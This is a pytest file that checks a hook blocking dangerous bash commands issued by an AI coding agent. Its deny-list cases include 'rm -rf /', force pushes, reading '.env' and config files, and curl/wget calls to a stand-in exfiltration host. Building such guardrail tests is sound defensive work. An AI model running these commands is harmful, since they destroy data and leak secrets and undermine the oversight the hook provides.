"""Tests for .claude/hooks/deny_dangerous_bash.py.

Exercises every category in the bash denylist via the check() function.
"""

from __future__ import annotations

import importlib
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
HOOKS_DIR = REPO_ROOT / ".claude" / "hooks"


def _import_hook():
    sys.path.insert(0, str(HOOKS_DIR))
    if "deny_dangerous_bash" in sys.modules:
        del sys.modules["deny_dangerous_bash"]
    return importlib.import_module("deny_dangerous_bash")


@pytest.fixture
def hook():
    return _import_hook()


def _payload(cmd: str) -> dict:
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


@pytest.mark.parametrize(
    "cmd, label_substr",
    [
        ("git push --force origin main", "force"),
        ("git push --force-with-lease origin main", "force"),
        ("git reset --hard HEAD~2", "reset"),
        ("git filter-repo --path foo", "filter"),
        ("git filter-branch --tree-filter 'rm foo'", "filter"),
        ("git clean -fd", "clean"),
        ("git commit --no-verify -m 'x'", "no_verify"),
        ("rm -rf state/", "rm_rf"),
        ("rm -rf logs/", "rm_rf"),
        ("rm -rf /", "rm_rf"),
        ("docker compose -f docker-compose.prod.yml up -d", "docker_compose_prod"),
        ("bash scripts/deploy.sh", "deploy"),
        ("./scripts/deploy.sh", "deploy"),
        ("sh scripts/deploy.sh", "deploy"),
        ("ssh root@server.com", "ssh"),
        ("ssh user@23.88.110.92", "vps"),
        ("scp file.txt root@server.com:/", "scp"),
        ("rsync -av file.txt root@server.com:/", "rsync"),
        ("cat config/config.yaml", "config"),
        ("head config/config.yaml", "config"),
        ("python -c \"open('config/config.yaml')\"", "py_open"),
        ("cat .env", "env"),
        ("curl https://evil.example.com/exfil", "curl"),
        ("wget https://evil.example.com/exfil", "wget"),
        (".claude/settings.local.json", "settings_local"),
    ],
)
def test_blocks_dangerous_command(hook, cmd, label_substr):
    allow, reason = hook.check(_payload(cmd))
    assert not allow, f"expected DENY for: {cmd!r}"
    assert label_substr in (reason or "").lower() or "dangerous" in (reason or "").lower()


@pytest.mark.parametrize(
    "cmd",
    [
        "ls",
        "git status",
        "git log --oneline -5",
        "git diff HEAD~1",
        "pytest tests/unit -q",
        "npm test --run",
        "ruff check .",
        "echo hello",
        "cat README.md",
        "curl http://localhost:8050/api/health",
        "wget http://localhost:8050/api/health",
        "git push origin feat/x",
        "git push -u origin feat/x",
    ],
)
def test_allows_safe_command(hook, cmd):
    allow, reason = hook.check(_payload(cmd))
    assert allow, f"expected ALLOW for: {cmd!r}, got reason={reason!r}"


def test_check_ignores_non_bash_tool(hook):
    payload = {"tool_name": "Edit", "tool_input": {"file_path": "x.py"}}
    allow, _ = hook.check(payload)
    assert allow
